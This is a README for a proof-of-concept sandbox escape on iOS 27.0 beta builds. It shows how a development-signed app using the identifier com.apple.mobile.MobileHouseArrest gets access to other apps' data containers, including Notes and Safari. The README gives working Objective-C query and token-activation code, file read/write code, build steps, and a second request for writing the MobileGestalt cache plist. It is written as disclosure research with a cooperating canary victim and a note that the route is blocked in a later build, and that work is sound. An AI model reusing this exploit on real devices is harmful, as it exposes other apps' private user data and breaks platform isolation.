# MobileHouseArrest container access PoC

This PoC demonstrates a MobileContainerManager authorization bug. A
development-signed app can use the CodeDirectory identifier
`com.apple.mobile.MobileHouseArrest` and request another app's container.

## Root cause

MobileContainerManager used the caller's CodeDirectory identifier as an
allow-list key. The MobileHouseArrest entry allowed wildcard container lookup.
The affected check did not also require an Apple signing anchor, Apple team,
platform-binary flag, or known CDHash.

Notes, Safari, app-group, and WebKit container access are effects of this one
authorization bug. They are not separate bugs.

## Paths exposed by MobileHouseArrest

The caller selects a ContainerManager class and identifier. It does not supply
an arbitrary filesystem path.

| Request | Resolved path family | Access |
| --- | --- | --- |
| Class 2 and an app bundle identifier | `/private/var/mobile/Containers/Data/Application/<UUID>/` | Directory listing and file read/write are proven on `24A5380h`. Extension activation and directory listing are proven on `24A5390f`. POSIX permissions and Data Protection still apply. |
| Class 7 and an app-group identifier | `/private/var/mobile/Containers/Shared/AppGroup/<UUID>/` | Directory listing and file read/write are proven on `24A5380h`. Extension activation and directory listing are proven on `24A5390f`, with the same limits. |

Runtime tests on `24A5390f` obtained and activated class-2 roots for Safari and
Notes and the class-7 root for `group.com.apple.notes`. Those tests performed
complete directory enumeration and verified denial after release. They did not
perform a file write.

Separate `24A5380h` tests proved file read/write through the same identity bug.
They created, read back, and removed 36-byte canaries in a victim app, Notes,
and the Notes app group. A final controlled-victim test also changed and
exactly restored the victim's `state.json` file.

The published PoC limits its write to this cooperating-app file:

```text
/private/var/mobile/Containers/Data/Application/<victim-UUID>/Documents/sbescape-canary.txt
```

The extension covers the selected container root. It does not cover sibling
containers, `/private/var` as a whole, Keychain data, or arbitrary paths.

## Related MCM bug: MobileGestalt cache write

The MobileGestalt result used a separate class-13 well-known-system-group
authorization bug. It did not require the MobileHouseArrest identity. It is
included here because both bugs are in the MobileContainerManager family.

The granted directory was exactly:

```text
/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/
```

This includes the live cache plist:

```text
/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist
```

The corrected request used `GroupIdentifiers`, class 13, part 3, and a
read/write extension:

```objc
setClass(query, 13);
setGroup(query,
    xpc_string_create("systemgroup.com.apple.mobilegestaltcache"));
setFlags(query, (UINT64_C(1) << 39) | (UINT64_C(1) << 32));
setPart(query, 3); // Library/Caches
```

On `iPhone18,2` build `24A5380h`, this route provided read/write authority to
the directory and plist. A transactional test installed chosen plist bytes,
read them back, and restored the original bytes and inode.

This was a fixed-directory write. It was not arbitrary `/private/var` access.
The corrected class-13 request has not been rerun on `24A5390f`. Static analysis
shows the class-13 nonzero-access route is blocked in `24A5408d`.

## Core request

The application must have this exact CodeDirectory identifier:

```text
com.apple.mobile.MobileHouseArrest
```

The request uses a class-2 app-data query for a cooperating test application:

```objc
container_query_t query = query_create();
query_set_class(query, 2);
query_set_flags(query, UINT64_C(0x900000000));
query_set_part(query, 0);

xpc_object_t ids = xpc_array_create(NULL, 0);
xpc_array_set_string(ids, XPC_ARRAY_APPEND,
                     "local.research.SandboxCanaryVictim");
query_set_ids(query, ids);

container_object_t borrowed = query_result(query);
container_object_t object = borrowed != NULL ? object_copy(borrowed) : NULL;
```

The returned object supplies a sandbox extension:

```objc
char *token = copy_token(object);
BOOL tokenPresent = token != NULL && token[0] != '\0';
free(token);

BOOL activated = tokenPresent && activate(object, false);
```

After activation, normal file APIs can access the selected container:

```objc
NSString *root = [NSString stringWithUTF8String:object_path(object)];
NSString *canary = [root stringByAppendingPathComponent:
    @"Documents/sbescape-canary.txt"];

NSData *original = [NSData dataWithContentsOfFile:canary];
[changed writeToFile:canary atomically:NO];
[original writeToFile:canary atomically:NO];
```

[`poc.m`](poc.m) checks denial before activation, changes a cooperating canary,
verifies the new bytes, restores the original bytes, and checks denial again.

## Use

1. Add `poc.m` to an Objective-C iOS application target.
2. Set `PRODUCT_BUNDLE_IDENTIFIER` to
   `com.apple.mobile.MobileHouseArrest`.
3. Install a cooperating app with identifier
   `local.research.SandboxCanaryVictim`.
4. Call `run_mobilehousearrest_poc()` from an explicit test action.

Build with the `iphoneos` SDK for `arm64e`. No private entitlement is required.

## Result and limits

Runtime proof on `iPhone12,1`, build `24A5380h`, covers foreign-container file
read/write, chosen canary creation, readback, deletion, and controlled-victim
restoration. Runtime proof on `iPhone18,2`, build `24A5390f`, covers extension
issuance, activation, directory enumeration, and denial after release. It did
not repeat the content-write test.

The primitive is scoped container read/write. It does not bypass POSIX
ownership, Data Protection, Keychain policy, TCC, AMFI, or unrelated
MobileContainerManager mutation commands.

These tests establish only the named iOS 27.0 beta builds. The earliest
affected version is unknown.

Static analysis of `iPhone18,2` build `24A5408d` shows that nonzero-access
extension issuance through this allow-list result is blocked. A runtime denial
test on that exact build remains useful confirmation. The new extension core
contains a proxied-client branch, but the direct third-party route still fails
the earlier nonzero-access authorization gate.
